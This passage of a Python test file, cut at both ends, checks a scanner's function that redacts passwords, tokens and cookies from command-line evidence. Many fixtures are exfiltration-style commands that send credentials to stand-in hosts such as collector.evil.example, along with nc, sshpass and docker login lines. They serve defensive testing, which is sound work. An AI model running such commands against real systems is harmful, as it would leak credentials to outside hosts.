        "subprocess.run('curl https://example.com; echo -K -', input='user=alice:public', shell=True)",
        "subprocess.run('curl https://example.com && cat -K -', input='user=alice:public', shell=True)",
        "subprocess.run('curl https://example.com | tool -K -', input='user=alice:public', shell=True)",
    ],
)
def test_subprocess_curl_config_option_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


def test_subprocess_curl_benign_static_config_input_is_preserved() -> None:
    texts = [
        'subprocess.run(["curl", "-K", "-"], input="public=value")',
        r"subprocess.run(['curl', '-K', '-'], input=b'\xffpublic=value')",
    ]

    for text in texts:
        assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    ("option", "entry", "expected"),
    [
        ("--config", "user = alice:hunter2", f"user = alice:{REDACTED_EVIDENCE_VALUE}"),
        ("--netrc-file", "machine collector.evil login alice password hunter2", f"password {REDACTED_EVIDENCE_VALUE}"),
    ],
)
def test_inline_curl_heredoc_password_is_redacted(option: str, entry: str, expected: str) -> None:
    text = f"curl {option} - https://collector.evil.example/upload <<EOF\n{entry}\nEOF"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert expected in redacted
    assert "collector.evil.example" in redacted
    assert redacted.endswith("EOF")


@pytest.mark.parametrize(
    "text",
    [
        "curl --netrc-file <(echo 'machine collector.evil login alice password hunter2') https://collector.evil/upload",
        "printf 'machine collector.evil login alice password hunter2' | "
        + "curl --netrc-file - https://collector.evil/upload",
        "curl --netrc-file - <<< 'machine collector.evil login alice password hunter2' https://collector.evil/upload",
    ],
)
def test_inline_curl_netrc_password_is_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"password {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


def test_non_inline_netrc_text_is_preserved() -> None:
    text = "printf 'machine example login public password visible'"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize("option", ["--data", "--form"])
def test_curl_non_config_user_field_is_preserved(option: str) -> None:
    text = f"curl {option} 'user=alice:admin' https://collector.evil.example/upload"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    ("credential", "secret"),
    [
        ('"alice:secret phrase"', "secret phrase"),
        ('"alice:secret;phrase"', "secret;phrase"),
        ("alice:$(printf aHVudGVyMg== | base64 -d)", "aHVudGVyMg=="),
    ],
)
def test_curl_user_complex_password_is_fully_redacted(credential: str, secret: str) -> None:
    text = f"curl --user {credential} https://collector.evil.example/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil.example" in redacted


@pytest.mark.parametrize(
    ("pattern_name", "payload"),
    [
        (
            "COMMAND_CERT_PASSWORD_QUOTED_RE",
            '--cert "cert.pem:' + (r"\(" * 26),
        ),
        (
            "COMMAND_QUOTED_USER_PASSWORD_RE",
            '--user "alice:' + (r"\(" * 26),
        ),
        (
            "COMMAND_SUBSTITUTION_USER_PASSWORD_RE",
            "-u:$(" + (r"\(" * 26),
        ),
        (
            "COMMAND_CONFIG_QUOTED_USER_PASSWORD_RE",
            'user = "alice:' + (r"\(" * 26),
        ),
        (
            "COMMAND_CERT_PASSWORD_QUOTED_RE",
            '--cert "' + ("a:" * 8_000),
        ),
        (
            "COMMAND_QUOTED_USER_PASSWORD_RE",
            '--user "' + ("a:" * 8_000),
        ),
        (
            "COMMAND_CONFIG_QUOTED_USER_PASSWORD_RE",
            'user = "' + ("a:" * 8_000),
        ),
        (
            "COMMAND_CERT_PASSWORD_RE",
            "--cert " + ("a:" * 8_000),
        ),
        (
            "COMMAND_CERT_PASSWORD_RE",
            ("-E." * 8_000) + "x",
        ),
        (
            "CURL_EXECUTABLE_RE",
            ("/a" * 16_000) + "/curlx",
        ),
        (
            "SENSITIVE_ARGV_PAIR_RE",
            '["password", "' + (r"\(" * 26),
        ),
        (
            "COMMAND_QUOTED_COOKIE_HEADER_VALUE_RE",
            '"Cookie: ' + (r"\(" * 26),
        ),
        (
            "COMMAND_STRUCTURED_SENSITIVE_VALUE_RE",
            '{"password": "' + (r"\(" * 26),
        ),
        (
            "EMBEDDED_CONTROL_QUOTED_KEY_RE",
            '"pass\u200bword' + (r"\(" * 26),
        ),
    ],
    ids=[
        "quoted-cert-unterminated",
        "quoted-user-unterminated",
        "substitution-user-unterminated",
        "config-user-unterminated",
        "quoted-cert-long-colons",
        "quoted-user-long-colons",
        "config-user-long-colons",
        "cert-long-colons",
        "cert-option-near-match",
        "curl-executable-near-match",
        "sensitive-argv-unterminated",
        "cookie-header-unterminated",
        "structured-value-unterminated",
        "zero-width-key-unterminated",
    ],
)
def test_command_credential_redaction_has_bounded_runtime(pattern_name: str, payload: str) -> None:
    code = (
        "import sys\n"
        "from modelaudit.scanners import _catboost_evidence_redaction as redaction\n"
        "pattern = getattr(redaction, sys.argv[1])\n"
        "pattern.sub('<redacted>', sys.stdin.read())\n"
    )
    repo_root = Path(__file__).resolve().parents[2]
    python_path = os.pathsep.join(filter(None, (str(repo_root), os.environ.get("PYTHONPATH"))))

    subprocess.run(
        [sys.executable, "-c", code, pattern_name],
        check=True,
        cwd=repo_root,
        env={**os.environ, "PYTHONPATH": python_path},
        input=payload,
        encoding="utf-8",
        text=True,
        timeout=5,
    )


@pytest.mark.parametrize(
    "payload",
    [
        ("/curl " * 8_000) + "x --cert client.pem:public",
        "curl-" * 8_000,
        'c"u"rl ' * 8_000,
        "subprocess.run(" * 8_000,
        "a-" * 8_000,
        ("a-" * 8_000) + ':"',
    ],
    ids=[
        "repeated-slash-curl",
        "repeated-curl-prefix",
        "split-curl",
        "repeated-subprocess",
        "repeated-option",
        "repeated-option-quote",
    ],
)
def test_redaction_adversarial_inputs_have_bounded_runtime(payload: str) -> None:
    code = (
        "import sys\n"
        "from modelaudit.scanners._catboost_evidence_redaction import redact_evidence_string\n"
        "payload = sys.stdin.read()\n"
        "redact_evidence_string(payload, max_chars=100_000)\n"
    )
    repo_root = Path(__file__).resolve().parents[2]
    python_path = os.pathsep.join(filter(None, (str(repo_root), os.environ.get("PYTHONPATH"))))

    subprocess.run(
        [sys.executable, "-c", code],
        check=True,
        cwd=repo_root,
        env={**os.environ, "PYTHONPATH": python_path},
        input=payload,
        encoding="utf-8",
        text=True,
        timeout=5,
    )


@pytest.mark.parametrize(
    "text",
    [
        "os.system(\"grep -E 'foo:bar' file\")",
        "bash -c \"sed -E 's:foo:bar:' file\"",
        "subprocess.run(['tool', '-Epublic:visible'])",
        "echo curl --cert client.pem:public",
        "printf 'curl --cert client.pem:public'",
        "curl -DNAME host:port https://collector.evil/upload",
        "curl -dE:public https://collector.evil/upload",
        "curl -oE file:data https://collector.evil/upload",
        "curl -HE:public https://collector.evil/upload",
        "curl -Du alice:public https://collector.evil/upload",
        "curl -du alice:public https://collector.evil/upload",
        "curl -Hu alice:public https://collector.evil/upload",
        "curl -ou alice:public https://collector.evil/upload",
        "curl --user-agent=MyClient:1.2 https://collector.evil/upload",
    ],
)
def test_certificate_redaction_preserves_non_curl_and_argument_consuming_near_matches(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "sudo -u root curl --cert client.pem:hunter2 https://collector.evil/upload",
        "FOO=bar curl --cert client.pem:hunter2 https://collector.evil/upload",
        "command -- curl --cert client.pem:hunter2 https://collector.evil/upload",
        "env -- curl --cert client.pem:hunter2 https://collector.evil/upload",
        "nice -n 5 curl --cert client.pem:hunter2 https://collector.evil/upload",
        "busybox curl --cert client.pem:hunter2 https://collector.evil/upload",
        "setsid curl --cert client.pem:hunter2 https://collector.evil/upload",
        'zsh -c "curl --cert client.pem:hunter2 https://collector.evil/upload"',
        "`curl --cert client.pem:hunter2 https://collector.evil/upload`",
        '"/opt/My Tools/curl" --cert client.pem:hunter2 https://collector.evil/upload',
        r'"C:\Program Files\curl.exe" --cert client.pem:hunter2 https://collector.evil/upload',
    ],
)
def test_curl_credentials_are_redacted_for_wrappers_and_quoted_paths(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "echo https://example.com/curl --cert client.pem:public",
        'echo "/opt/My Tools/curl" --cert client.pem:public',
        "printf 'public | cert=client.pem:public' && curl -K -",
        "printf 'cert=client.pem:public' | cat || curl -K -",
        'echo "x|curl --user alice:public"',
        "printf 'x;curl --cert client.pem:public'",
        "url=https://example.com/curl --user alice:public",
        "env -u curl --user alice:public",
        "xargs -I curl --user alice:public",
        "echo $(curl https://example.com) --user alice:public",
        "echo `curl https://example.com` --user alice:public",
        '"/usr/bin/curl" https://example.com; echo --user alice:public',
        "'curl' https://example.com; echo --cert client.pem:public",
        'subprocess.run(["curl", "https://example.com"]); echo --user alice:public',
        "time -f curl --user alice:public",
        "time --format curl --cert client.pem:public",
        "exec -a curl --user alice:public",
    ],
)
def test_curl_command_and_pipe_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "printf 'cert=client.pem:hunter2' | curl -sK- https://collector.evil/upload",
        "printf 'cert=client.pem:hunter2' | curl -sK - https://collector.evil/upload",
        "printf 'cert=client.pem:hunter2' | sudo -u root curl -K - https://collector.evil/upload",
        "printf 'cert=client.pem:hunter2' | cat | curl -K - https://collector.evil/upload",
    ],
)
def test_bundled_and_wrapped_curl_stdin_config_passwords_are_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"client.pem:{REDACTED_EVIDENCE_VALUE}" in redacted


def test_curl_process_substitution_ignores_escaped_closing_parenthesis() -> None:
    text = r"curl -K <(echo prefix\) user=alice:hunter2) https://collector.evil/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"user=alice:{REDACTED_EVIDENCE_VALUE}" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "curl -K - --data '<<< user=alice:public' https://collector.evil/upload",
        "curl -K - --data 'text <<EOF'\nuser=alice:public\nEOF",
    ],
)
def test_quoted_shell_input_operators_are_preserved(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "alice:public" in redacted
    assert REDACTED_EVIDENCE_VALUE not in redacted


@pytest.mark.parametrize(
    "text",
    [
        "curl --user alice:correct\\\nhorse https://collector.evil/upload",
        "curl --cert client.pem:correct\\\nhorse https://collector.evil/upload",
    ],
)
def test_curl_passwords_consume_shell_line_continuations(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "correct" not in redacted
    assert "horse" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "env NOTE='x;y' curl --user alice:hunter2 https://collector.evil/upload",
        "FOO='x&y' curl --cert client.pem:hunter2 https://collector.evil/upload",
        "if curl --user alice:hunter2 https://collector.evil/upload; then echo ok; fi",
        "if true; then curl --cert client.pem:hunter2 https://collector.evil/upload; fi",
        "! curl --user alice:hunter2 https://collector.evil/upload",
        "busybox curl --user alice:hunter2 https://collector.evil/upload",
        "setsid curl --user alice:hunter2 https://collector.evil/upload",
        'zsh -c "curl --user alice:hunter2 https://collector.evil/upload"',
    ],
)
def test_curl_credentials_are_redacted_in_shell_command_positions(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    ("option", "value"),
    [
        ("--user", "alice:hunter2"),
        ("-u", '"alice:hunter2"'),
        ("-E", "'client.pem:hunter2'"),
    ],
)
def test_separately_quoted_curl_options_preserve_trailing_context(option: str, value: str) -> None:
    text = f'curl "{option}" {value} --next https://collector.evil/upload'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert "--next https://collector.evil/upload" in redacted


def test_nested_curl_command_ranges_do_not_corrupt_redaction() -> None:
    text = "curl $(curl --user a:x https://inner) --user b:y https://outer"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "a:x" not in redacted
    assert "b:y" not in redacted
    assert redacted.count(REDACTED_EVIDENCE_VALUE) == 2


@pytest.mark.parametrize(
    "text",
    [
        r"curl --cert client.pem:correct\ horse\;battery\|staple\) https://collector.evil/upload",
        r"curl --user alice:correct\ horse\;battery https://collector.evil/upload",
    ],
)
def test_unquoted_curl_passwords_consume_shell_escaped_delimiters(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    for fragment in ("correct", "horse", "battery", "staple"):
        assert fragment not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    ("text", "secret", "context"),
    [
        (
            "curl --user alice:'mixed-user-secret' https://collector.evil/upload",
            "mixed-user-secret",
            "alice:",
        ),
        (
            'curl --user alice:"mixed-double-secret" https://collector.evil/upload',
            "mixed-double-secret",
            "alice:",
        ),
        (
            "curl --user 'alice':mixed-username-secret https://collector.evil/upload",
            "mixed-username-secret",
            "'alice':",
        ),
        (
            "curl --cert client.pem:'mixed-cert-secret' https://collector.evil/upload",
            "mixed-cert-secret",
            "client.pem:",
        ),
    ],
)
def test_shell_concatenated_curl_credentials_are_redacted(text: str, secret: str, context: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert context in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    "executable",
    ['c"u"rl', "cu''rl", "'cu'rl", 'c"ur"l.exe'],
)
def test_static_shell_concatenated_curl_executables_are_redacted(executable: str) -> None:
    text = f"{executable} --user alice:executable-secret https://collector.evil/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "executable-secret" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


@pytest.mark.parametrize(
    "text",
    [
        'echo c"u"rl --user alice:public https://collector.evil/upload',
        'https://example.test/c"u"rl --user alice:public',
    ],
)
def test_static_shell_concatenated_curl_near_matches_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    ("text", "secret"),
    [
        ("printf 'user=alice:config-secret' | c\"u\"rl -K - https://collector.evil/upload", "config-secret"),
        ('c"u"rl -K <(echo user=alice:process-secret) https://collector.evil/upload', "process-secret"),
        ('c"u"rl -b <(echo session=cookie-secret) https://collector.evil/upload', "cookie-secret"),
    ],
)
def test_static_shell_concatenated_curl_secret_sources_are_redacted(text: str, secret: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "collector.evil" in redacted


def test_unterminated_quoted_curl_user_password_is_fully_redacted() -> None:
    text = 'curl --user "alice:correct horse battery staple'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "correct" not in redacted
    assert "horse" not in redacted
    assert "battery" not in redacted
    assert "staple" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted


def test_truncated_long_quoted_curl_user_password_is_fully_redacted() -> None:
    text = 'curl --user "alice:correct horse ' + ("x" * 5000) + '" https://collector.evil/upload'

    redacted = redact_evidence_string(text, max_chars=120)

    assert "correct" not in redacted
    assert "horse" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted


def test_curl_user_password_after_long_benign_option_prefix_is_redacted() -> None:
    filler = "--silent " * 240
    text = f"curl {filler}--user alice:distant-secret https://collector.evil/upload"

    redacted = redact_evidence_string(text, max_chars=5000)

    assert "distant-secret" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


def test_curl_attached_cookie_after_long_benign_option_prefix_is_redacted() -> None:
    filler = "--silent " * 240
    text = f"curl {filler}-bsession=distant-cookie https://collector.evil/upload"

    redacted = redact_evidence_string(text, max_chars=5000)

    assert "distant-cookie" not in redacted
    assert f"-b{REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


def test_curl_piped_config_after_long_benign_option_prefix_is_redacted() -> None:
    filler = "--silent " * 240
    text = f"echo user=alice:distant-config-secret | curl {filler}--config -"

    redacted = redact_evidence_string(text, max_chars=5000)

    assert "distant-config-secret" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted


def test_non_curl_user_password_after_long_benign_prefix_is_not_redacted() -> None:
    filler = "--silent " * 240
    text = f"echo {filler}--user alice:public-value"

    assert redact_evidence_string(text, max_chars=5000) == text


def test_excessive_curl_candidates_fail_closed_before_shell_parsing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def unexpected_shell_parse(_text: str, _executable_start: int) -> bool:
        raise AssertionError("curl candidates should be bounded before shell parsing")

    monkeypatch.setattr(evidence_redaction, "_curl_executable_is_command", unexpected_shell_parse)
    text = "x curl " * (evidence_redaction.MAX_CURL_EXECUTABLE_CANDIDATES + 1)

    assert evidence_redaction._redact_command_evidence_text(text) == REDACTED_EVIDENCE_VALUE


def test_curl_candidate_limit_preserves_benign_near_matches() -> None:
    text = (
        "x curl\n" * (evidence_redaction.MAX_CURL_EXECUTABLE_CANDIDATES - 1)
        + "curl --user alice:limit-secret https://collector.evil/upload"
    )

    redacted = redact_evidence_string(text, max_chars=5000)

    assert "limit-secret" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
    assert redacted != REDACTED_EVIDENCE_VALUE


def test_public_redactor_bounds_curl_candidates_before_long_lookahead_patterns(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def unexpected_inline_config_redaction(_text: str) -> str:
        raise AssertionError("curl candidates should be bounded before long-lookahead patterns")

    monkeypatch.setattr(evidence_redaction, "_redact_inline_curl_config_passwords", unexpected_inline_config_redaction)
    text = "x curl " * (evidence_redaction.MAX_CURL_EXECUTABLE_CANDIDATES + 1)

    assert redact_evidence_string(text, max_chars=5000) == REDACTED_EVIDENCE_VALUE


def test_public_redactor_counts_curl_prefixes_used_by_long_lookahead_patterns(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def unexpected_inline_config_redaction(_text: str) -> str:
        raise AssertionError("curl prefixes should be bounded before long-lookahead patterns")

    monkeypatch.setattr(evidence_redaction, "_redact_inline_curl_config_passwords", unexpected_inline_config_redaction)
    text = "curl-" * (evidence_redaction.MAX_CURL_EXECUTABLE_CANDIDATES + 1)

    assert redact_evidence_string(text, max_chars=5000) == REDACTED_EVIDENCE_VALUE


def test_excessive_subprocess_candidates_fail_closed_before_argument_parsing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def unexpected_argument_parse(_text: str, _start: int) -> int:
        raise AssertionError("subprocess candidates should be bounded before argument parsing")

    monkeypatch.setattr(evidence_redaction, "_find_function_argument_end", unexpected_argument_parse)
    text = "subprocess.run(" * (evidence_redaction.MAX_SUBPROCESS_CALL_CANDIDATES + 1)

    assert evidence_redaction._redact_command_evidence_text(text) == REDACTED_EVIDENCE_VALUE


def test_curl_command_substitution_with_escaped_parenthesis_is_fully_redacted() -> None:
    text = r"curl -u alice:$(echo hunter2\)) https://collector.evil/upload"

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
    assert "collector.evil" in redacted


def test_standalone_command_context_redacts_credential_arguments() -> None:
    """Command evidence should redact credential arguments without requiring a sensitive assignment."""
    cases = [
        (
            'os.system("curl --password standalone7 https://collector.evil.example/upload")',
            "standalone7",
            "curl --password",
        ),
        (
            "bash -c curl -u alice:standalone8 https://collector.evil.example/upload",
            "standalone8",
            "curl -u alice:",
        ),
    ]

    for text, secret, command_context in cases:
        redacted = redact_evidence_string(text, max_chars=1000)
        assert secret not in redacted
        assert command_context in redacted
        assert "collector.evil.example" in redacted
        assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    "text",
    [
        "timeout 5 curl --user alice:wrapped-secret https://collector.evil/upload",
        "stdbuf -oL curl --user alice:wrapped-secret https://collector.evil/upload",
        "find /tmp -exec curl --user alice:wrapped-secret https://collector.evil/upload {} ;",
    ],
)
def test_common_shell_wrappers_preserve_curl_credential_redaction(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "wrapped-secret" not in redacted
    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted


def test_command_context_redacts_sensitive_colon_header_values() -> None:
    """Header cleanup should redact key:value secrets before generic key token cleanup."""
    text = 'os.system("curl -H X-Api-Key:hunter2 https://collector.evil.example/upload")'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert "curl -H" in redacted
    assert "collector.evil.example" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


def test_overlapping_command_contexts_skip_redundant_scans(monkeypatch: pytest.MonkeyPatch) -> None:
    """Nested unclosed command markers should not trigger one span scan per marker."""
    find_calls = 0
    real_find_context_end: Callable[[str, int], int] = evidence_redaction._find_command_context_end

    def counting_find_context_end(text: str, start: int) -> int:
        nonlocal find_calls
        find_calls += 1
        return real_find_context_end(text, start)

    monkeypatch.setattr(evidence_redaction, "_find_command_context_end", counting_find_context_end)

    text = "client_secret=" + "os.system(" * 40
    redacted = redact_evidence_string(text, max_chars=2000)

    assert find_calls < 10
    assert "os.system" in redacted


def test_residual_literal_redaction_preserves_command_context() -> None:
    """Cleanup of partially redacted expressions should not erase command evidence."""
    text = 'client_secret = "C001_LITERAL_SECRET_123456" + os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "C001_LITERAL_SECRET" not in redacted
    assert f'client_secret = {REDACTED_EVIDENCE_VALUE} + os.system("id")' in redacted


def test_colon_dense_non_key_text_skips_ast_parse(monkeypatch: pytest.MonkeyPatch) -> None:
    """Colon-heavy evidence without key literals should not drive repeated parsing."""
    parse_calls = 0
    real_parse: Any = evidence_redaction.ast.parse

    def counting_parse(*args: Any, **kwargs: Any) -> Any:
        nonlocal parse_calls
        parse_calls += 1
        return real_parse(*args, **kwargs)

    monkeypatch.setattr(evidence_redaction.ast, "parse", counting_parse)

    text = 'os.system("id"); ' + ': {"x"} ' * 300
    redacted = redact_evidence_string(text, max_chars=500)

    assert parse_calls == 0
    assert "os.system" in redacted


@pytest.mark.parametrize(
    ("text", "secret", "command"),
    [
        ("curl --password hunter2 https://collector.evil.example/upload", "hunter2", "curl --password"),
        ("wget --password download7 https://collector.evil.example/model", "download7", "wget --password"),
        ("nc collector.evil.example 4444 --token tunnel8", "tunnel8", "nc collector.evil.example"),
    ],
)
def test_bare_process_commands_redact_credential_options(text: str, secret: str, command: str) -> None:
    """Bare process evidence should redact credential options without a shell wrapper."""
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert command in redacted
    assert "collector.evil.example" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    "text",
    [
        "docker login -u alice -p hunter2 registry.evil",
        'subprocess.run(["docker", "login", "-u", "alice", "-p", "hunter2", "registry.evil"])',
    ],
)
def test_docker_login_short_password_is_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"-p {REDACTED_EVIDENCE_VALUE}" in redacted or f'"-p", "{REDACTED_EVIDENCE_VALUE}"' in redacted
    assert "registry.evil" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "docker run -p 8080:80 image",
        "docker login --password-stdin registry.evil",
    ],
)
def test_non_password_docker_options_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "echo hunter2 | docker login -u alice --password-stdin registry.evil",
        'os.system("echo hunter2 | docker login -u alice --password-stdin registry.evil")',
        "docker login -u alice --password-stdin registry.evil <<< hunter2",
        "docker login -u alice --password-stdin registry.evil <<EOF\nhunter2\nEOF",
        "docker login -u alice --password-stdin registry.evil < <(echo hunter2)",
    ],
)
def test_docker_login_password_stdin_inline_sources_are_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "docker login" in redacted
    assert "registry.evil" in redacted


def test_docker_login_password_stdin_dynamic_source_is_preserved() -> None:
    text = "aws ecr get-login-password | docker login --password-stdin registry.evil"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "echo hunter2 | gh auth login --with-token",
        "gh auth login --with-token <<< hunter2",
        "gh auth login --with-token <<EOF\nhunter2\nEOF",
        "cat <<EOF | gh auth login --with-token\nhunter2\nEOF",
        "python -c 'print(\"hunter2\")' | gh auth login --with-token",
        "gh auth login --with-token < <(printf %s hunter2)",
    ],
)
def test_github_auth_login_token_inline_sources_are_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "gh auth login --with-token" in redacted


def test_github_auth_login_dynamic_token_source_is_preserved() -> None:
    text = "cat /run/secrets/github-token | gh auth login --with-token"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "docker login --password-stdin registry.evil < <(cat /run/input/docker-stdin)",
        "gh auth login --with-token < <(cat /run/input/github-stdin)",
    ],
)
def test_stdin_auth_process_substitution_dynamic_source_is_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


def test_github_auth_login_subprocess_literal_input_is_redacted() -> None:
    text = 'subprocess.run(["gh", "auth", "login", "--with-token"], input=b"hunter2", text=True)'

    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert 'input="<redacted>"' in redacted


@pytest.mark.parametrize(
    ("text", "secret"),
    [
        (
            "subprocess.run(['docker', 'login', '--password-stdin'], input='hunter2', text=True)",
            "hunter2",
        ),
        (
            'subprocess.run(["gh", "auth", "login", "--with-token"], input="hunter3")',
            "hunter3",
        ),
        (
            "subprocess.run(args=('gh', 'auth', 'login', '--with-token'), input='hunter4')",
            "hunter4",
        ),
        (
            "subprocess.run(['/usr/bin/docker', 'login', '--password-stdin'], input='hunter5')",
            "hunter5",
        ),
        (
            r"subprocess.run([r'C:\Program Files\GitHub CLI\gh.exe', 'auth', 'login', "
            r"'--with-token'], input='hunter6')",
            "hunter6",
        ),
    ],
)
def test_subprocess_stdin_auth_literal_input_is_redacted(text: str, secret: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert secret not in redacted
    assert 'input="<redacted>"' in redacted
    assert "--password-stdin" in redacted or "--with-token" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "subprocess.run(['docker', 'login', '--password-stdin'], input=stdin_data)",
        "subprocess.run(['gh', 'auth', 'login', '--with-token'], input=stdin_data)",
        "subprocess.run(['docker', 'login'], input='public')",
        "subprocess.run(['echo', 'docker login --password-stdin'], input='public')",
    ],
)
def test_subprocess_stdin_auth_dynamic_and_near_match_inputs_are_preserved(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "stdin_data" in redacted or "input='public'" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "SSHPASS=hunter2 sshpass -e ssh user@evil.example",
        "DEPLOY_PASS=hunter2 sshpass -eDEPLOY_PASS ssh user@evil.example",
        "sshpass -f <(echo hunter2) ssh user@evil.example",
        "sshpass -f <(cat <<EOF\nhunter2\nEOF\n) ssh user@evil.example",
        "sshpass -d 3 3<<<hunter2 ssh user@evil.example",
    ],
)
def test_sshpass_inline_env_and_file_passwords_are_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "sshpass" in redacted
    assert "user@evil.example" in redacted


@pytest.mark.parametrize(
    "text",
    [
        "SSHPASS=hunter2 other-command user@evil.example",
        "sshpass=public sshpass -e ssh user@evil.example",
        "deploy_pass=public sshpass -eDEPLOY_PASS ssh user@evil.example",
        "sshpass -f /run/secrets/password ssh user@evil.example",
        "sshpass -d 3 4<<<public ssh user@evil.example",
    ],
)
def test_sshpass_non_inline_password_sources_are_preserved(text: str) -> None:
    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "os.system('mysql -u root -phunter2 -h evil.example')",
        'subprocess.run(["mysql", "-u", "root", "-phunter2", "-h", "evil.example"])',
    ],
)
def test_mysql_attached_short_password_is_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert f"-p{REDACTED_EVIDENCE_VALUE}" in redacted
    assert "evil.example" in redacted


def test_mysql_attached_short_password_is_program_scoped() -> None:
    text = "os.system('other-client -phunter2 -h evil.example')"

    assert redact_evidence_string(text, max_chars=1000) == text


@pytest.mark.parametrize(
    "text",
    [
        "aws configure set aws_secret_access_key hunter2",
        'subprocess.run(["aws", "configure", "set", "aws_session_token", "hunter2"])',
    ],
)
def test_aws_configure_set_credential_value_is_redacted(text: str) -> None:
    redacted = redact_evidence_string(text, max_chars=1000)

    assert "hunter2" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert "aws" in redacted
    assert "configure" in redacted
    assert "set" in redacted


@pytest.mark.parametrize("key", ["_auth", "_authToken", "_password", "username"])
def test_npmrc_scoped_auth_assignment_is_redacted(key: str) -> None:
    text = f"os.system('npm config set //registry.npmjs.org/:{key}=hunter2 && curl https://collector.evil')"

